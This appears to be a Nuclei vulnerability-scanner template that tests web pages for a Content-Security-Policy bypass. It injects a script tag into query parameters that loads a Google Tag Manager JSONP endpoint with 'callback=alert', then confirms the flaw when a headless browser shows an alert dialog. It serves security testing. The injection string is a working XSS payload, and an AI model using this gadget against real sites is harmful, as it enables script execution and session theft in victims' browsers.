id: www-googletagmanager-csp-xss

info:
  name: Content-Security-Policy Bypass via Google Tag Manager
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,googletagmanager

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{RootURL}}{{trim_prefix(http_matched, RootURL)}}"

      - action: waitload

      - action: waitdialog
        name: www_googletagmanager_csp_xss
        args:
          type: alert
          timeout: 5000

    matchers:
      - type: dsl
        dsl:
          - "www_googletagmanager_csp_xss == true" 